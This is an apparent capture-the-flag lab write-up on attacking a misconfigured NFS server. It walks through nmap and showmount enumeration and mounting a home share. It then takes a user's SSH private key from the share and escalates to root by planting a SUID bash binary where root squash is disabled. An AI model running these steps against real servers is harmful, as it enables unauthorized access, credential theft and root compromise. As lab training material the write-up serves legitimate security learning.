
![Pasted image 20240919160551](https://github.com/user-attachments/assets/282a5c8a-2c4f-463d-a591-2011b4c8ca87)



NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

The file handle
 The name of the file to be accessed
 The user's, user ID
 The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, read and write of files.

###  Enumerating NFS:

nmap  -A 10.10.191.163 -T5 -p- -nnvvvv

![Pasted image 20240920095232](https://github.com/user-attachments/assets/22ec02c8-876d-4dea-b274-bf6858953df5)

### Using Nmap NSE nfs scripts:

![Pasted image 20240919163929](https://github.com/user-attachments/assets/6145205e-e2e4-43a8-898f-b8b4f65cd51e)



 nmap --script nfs-* 10.10.191.163  -T4  -nnvvvv


![Pasted image 20240920095032](https://github.com/user-attachments/assets/cc3ab798-f03e-4738-a7df-f2615cb8bbf3)


#### Using showmount to list the shares on the remote host:

showmount queries the mount daemon on a remote host for information about the state of the NFS server on that machine. With no options showmount lists the set of clients who are mounting from that host

/usr/sbin/showmount -e 10.10.191.163


![Pasted image 20240920095126](https://github.com/user-attachments/assets/3bd751c4-543f-4afa-8f9c-b7555582d7a6)



### Portmap traffic:


The portmap service maps RPC service and version numbers to transport-specific port numbers.

When an RPC service is started, it will tell portmap what port number it is listening to, and what RPC program numbers it is prepared to serve. When a client wishes to make an RPC call to a given program number, it will first contact portmap on the server machine to determine the port number where RPC packets should be sent.

![Pasted image 20240920100456](https://github.com/user-attachments/assets/fb5a1d25-94f8-4d74-abf2-cfd1e4700cec)

### Portmap process:

The server registers with portmap.
The client gets the server’s port from portmap.
The client calls the server.

Network communication: 



![Pasted image 20240920095904](https://github.com/user-attachments/assets/1cedc99e-9313-4c80-8874-7941f024bbfc)



![Pasted image 20240920100041](https://github.com/user-attachments/assets/28ff5c7b-5a64-478a-a225-b1fa4ad3a013)

When a client needs to mount a file system from a server, the client must obtain a file handle from the server. The file handle must correspond to the file system. This process requires that several transactions occur between the client and the server. In this example, the client is attempting to mount /home/ from the server 10.10.191.163 . A snoop trace for this transaction follows.


![Pasted image 20240920100127](https://github.com/user-attachments/assets/38cf5180-6b0d-44c0-a2aa-c23071c959f4)



### Mounting the share to local machine:

Create a directory where the share will be mounted:

mkdir /tmp/mount


sudo mount -t nfs 10.10.191.163:home /tmp/mount/ -nolock
 
### Breaking this down: 


mount : Execute the mount command

-t nfs : Type of device to mount, then specifying that it's NFS

IP:share:  	The IP Address of the NFS server, and the name of the share we wish to mount

-nolock: pecifies not to use NLM locking

### Navigating to the mounted share:

cd /tmp/mount
ls -l


![Pasted image 20240920102239](https://github.com/user-attachments/assets/7b843650-b8c8-433b-a928-bac9a125524c)

cd cappucino

![Pasted image 20240920102820](https://github.com/user-attachments/assets/74fbfa43-46b7-4188-bf5f-f922bdf7f85b)

cd .ssh

![Pasted image 20240920102756](https://github.com/user-attachments/assets/b7a118aa-47a3-4172-9b77-be15bd2bdc0f)


Looking at the connect of the id_rsa key with "nano" command :



![Pasted image 20240920103035](https://github.com/user-attachments/assets/b9145623-b73f-4497-ae92-0c423a84663e)



looking at the content of the authorized_keys with the "cat" command:



![Pasted image 20240920103610](https://github.com/user-attachments/assets/98b5707e-53b5-4c78-bd2b-c18a7ccbf55a)

I copied the private key to my local system and changed the permissions with chmod 600 file_name


ls -lhr id_rsa 

![Pasted image 20240920103435](https://github.com/user-attachments/assets/c303846c-78d8-4846-bf2b-19d7aaaab3f0)


### Login into the server via SSH using the private key:


ssh -i id_rsa cappucino@10.10.191.163


![Pasted image 20240920104035](https://github.com/user-attachments/assets/b7977ea7-3266-4b3e-8c42-85e1073015cc)

### Exploding NFS:


By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system. 

 Files with the SUID means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!
### Downloading the bash shell from the NFS server to local system:


scp -i ~/id_rsa  cappucino@10.10.191.163:/bin/bash ~/Downloads/bash

changing the permissions owner to root:

chown root bash


![Pasted image 20240920105617](https://github.com/user-attachments/assets/b6472191-b3c7-44db-bf5b-96be01625229)

Copying the bash file to /tmp/mount directory 

cp ~/Download/bash /tmp/mount

### Changing the permissions to SUID bit  using chmod:

chmod +s bash 



![Pasted image 20240920113954](https://github.com/user-attachments/assets/cf873900-dcac-4f74-94f9-8c065c02687b)


## Summary:


NFS Access 
Gain Low Privilege Shell 
Upload Bash Executable to the NFS share
Set SUID Permissions Through NFS Due To Misconfigured Root Squash
Login through SSH
Execute SUID Bit Bash Executable
ROOT ACCESS
